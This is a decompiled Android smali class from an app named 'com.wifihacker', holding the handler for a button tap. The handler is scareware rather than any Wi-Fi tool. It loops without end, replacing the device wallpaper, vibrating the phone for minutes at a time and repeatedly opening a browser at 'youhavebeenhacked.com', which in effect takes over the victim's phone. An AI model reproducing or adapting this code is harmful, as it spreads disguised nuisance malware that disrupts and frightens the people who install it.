.class Lcom/wifihacker/Main2Activity$3;
.super Ljava/lang/Object;
.source "Main2Activity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/wifihacker/Main2Activity;->initialize(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/wifihacker/Main2Activity;


# direct methods
.method constructor <init>(Lcom/wifihacker/Main2Activity;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    .line 108
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/wifihacker/Main2Activity$3;)Lcom/wifihacker/Main2Activity;
    .locals 1

    .prologue
    .line 108
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    return-object v0
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 4

    .prologue
    .line 112
    :goto_0
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    new-instance v1, Lcom/wifihacker/Main2Activity$3$1;

    invoke-direct {v1, p0}, Lcom/wifihacker/Main2Activity$3$1;-><init>(Lcom/wifihacker/Main2Activity$3;)V

    invoke-static {v0, v1}, Lcom/wifihacker/Main2Activity;->access$0(Lcom/wifihacker/Main2Activity;Ljava/util/TimerTask;)V

    .line 123
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v0}, Lcom/wifihacker/Main2Activity;->access$1(Lcom/wifihacker/Main2Activity;)Ljava/util/Timer;

    move-result-object v0

    iget-object v1, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v1}, Lcom/wifihacker/Main2Activity;->access$2(Lcom/wifihacker/Main2Activity;)Ljava/util/TimerTask;

    move-result-object v1

    const-wide/16 v2, 0x2710

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 124
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v0}, Lcom/wifihacker/Main2Activity;->access$3(Lcom/wifihacker/Main2Activity;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "android.intent.action.VIEW"

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    .line 125
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v0}, Lcom/wifihacker/Main2Activity;->access$3(Lcom/wifihacker/Main2Activity;)Landroid/content/Intent;

    move-result-object v0

    const-string v1, "https://youhavebeenhacked.com/"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    .line 128
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-virtual {v0}, Lcom/wifihacker/Main2Activity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/app/WallpaperManager;->getInstance(Landroid/content/Context;)Landroid/app/WallpaperManager;

    move-result-object v0

    .line 130
    const v1, 0x7f07009b

    :try_start_0
    invoke-virtual {v0, v1}, Landroid/app/WallpaperManager;->setResource(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 134
    :goto_1
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v0}, Lcom/wifihacker/Main2Activity;->access$4(Lcom/wifihacker/Main2Activity;)Landroid/os/Vibrator;

    move-result-object v0

    const-wide/32 v2, 0x5a35b

    invoke-virtual {v0, v2, v3}, Landroid/os/Vibrator;->vibrate(J)V

    .line 135
    iget-object v0, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    iget-object v1, p0, Lcom/wifihacker/Main2Activity$3;->this$0:Lcom/wifihacker/Main2Activity;

    invoke-static {v1}, Lcom/wifihacker/Main2Activity;->access$3(Lcom/wifihacker/Main2Activity;)Landroid/content/Intent;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/wifihacker/Main2Activity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    .line 131
    :catch_0
    move-exception v0

    .line 132
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
